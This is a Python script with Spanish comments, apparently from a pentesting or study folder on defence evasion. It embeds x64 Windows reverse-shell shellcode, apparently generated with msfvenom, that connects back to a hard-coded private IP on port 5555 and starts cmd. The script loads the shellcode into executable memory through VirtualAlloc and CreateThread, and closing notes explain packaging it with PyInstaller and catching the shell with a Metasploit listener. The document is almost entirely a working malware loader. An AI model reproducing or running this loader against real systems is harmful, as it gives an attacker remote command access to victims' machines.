import ctypes

buf =  b""
buf += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
buf += b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
buf += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
buf += b"\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
buf += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
buf += b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
buf += b"\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
buf += b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44"
buf += b"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
buf += b"\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
buf += b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
buf += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
buf += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
buf += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
buf += b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
buf += b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
buf += b"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49"
buf += b"\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49"
buf += b"\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5"
buf += b"\x49\xbc\x02\x00\x15\xb3\xc0\xa8\x92\x8a\x41\x54"
buf += b"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
buf += b"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41"
buf += b"\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9"
buf += b"\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0"
buf += b"\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
buf += b"\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9"
buf += b"\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40"
buf += b"\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
buf += b"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d"
buf += b"\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
buf += b"\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68"
buf += b"\x48\x89\xe6\x56\x50\x41\x50\x41\x50\x41\x50\x49"
buf += b"\xff\xc0\x41\x50\x49\xff\xc8\x4d\x89\xc1\x4c\x89"
buf += b"\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48\x31\xd2"
buf += b"\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
buf += b"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d"
buf += b"\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb"
buf += b"\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41"
buf += b"\x89\xda\xff\xd5"

# Carga de la librería 'Kernel32.dll' para interactuar con la API de Windows
kernel32 = ctypes.windll.kernel32

# Su función es decirle a Python qué tipo de dato espera como resultado
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p

# Alojar memoria en el objetivo
lpAddress = kernel32.VirtualAlloc(
    # No se recomienda poner la dirección manualmente ya que podría coincidir con un fragmento que no se puede escribir. La tiene que elegir el OS
    ctypes.c_void_p(0),
    # Se indica el tamaño de la memoria a asignar, en este caso el largo del shellcode anterior
    ctypes.c_size_t(len(buf)),
    # Propiedades de la memoria como los tipos de asignación. 
    # En este caso es una dirección numérica en hexadecimal que apunta a una ubicación específica en la memoria.
    0x3000,
    # Hace referencia a que este fragmento de memoria tenga capacidad de lectura, escritura y ejecución.
    0x40
)

if not lpAddress:
    raise Exception('[!] La asignación de memoria ha fallado.')

# Se copia el shellcode en la memoria asignada
ctypes.memmove(lpAddress, buf, len(buf)) # A partir de esa dirección, según esa longitud va a copiar el shellcode alojado en la variable 'buf'

# Se inicia un thread
thread = kernel32.CreateThread(
    # Se asiganan argumentos donde la mayoría estarán vacíos
    ctypes.c_void_p(0), # 0 Atributos especiales (predeterminados)
    ctypes.c_size_t(0), # 0 (por defecto) el tamaño de la pila, para que el OS lo asigne por defecto
    ctypes.c_void_p(lpAddress), # Dirección de memoria de inicio del hilo (thread), o sea, por dónde va a comenzar a cargar y ejecutar la memoria.
    ctypes.c_void_p(0), # 0 Argumentos del thread (predeterminados)
    ctypes.c_ulong(0), # Opciones de creación predeterminadas
    ctypes.pointer(ctypes.c_ulong(0)) # Identificador del thread que será asignado automáticamente.
)

# Si no se puede crear el hilo
if not thread:
    raise Exception('[!] Creación fallida del hilo.')

# Ejecutar y esperar el hilo
kernel32.WaitForSingleObject(thread, 0xFFFFFFFF)

# 0xFFFFFFFF => indican que espere indefinidamente hasta que finalice el hilo

'''
- Compilarlo:
WINEPREFIX=~/.WINE64 winearch=win64 wine pyinstaller --onefile /home/kali/Desktop/Scripts/Evasion_Defensas/shellcode_evasion.py

- Usar multi/handler de Metasploit como listener y configurarlo:
LHOST: IP_ATACANTE
LPORT: 5555 => EN ESTE EJEMPLO
PAYLOAD: windows/x64/shell_reverse_tcp => USADO EN MSFVENOM PARA CREAR LA SHELLCODE

'''